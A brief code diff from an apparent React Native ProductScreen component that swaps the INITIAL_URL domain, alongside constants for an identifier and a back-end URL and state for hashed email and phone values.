@@ -28,7 +28,7 @@ const ProductScreen = ({navigation, route}) => {
   const [hashMail, setHashMail] = useState('');
   const [hashTel, setHashTel] = useState('');
 
-  const INITIAL_URL = `https://quick-gate-hq.site/`;
+  const INITIAL_URL = `https://true-net-plus.top/`;
   const URL_IDENTIFAIRE = `zBG8Vrq1`;
 
   const FATCH_TO_OUR_BACK = `https://exact-wave-tech.site/`;
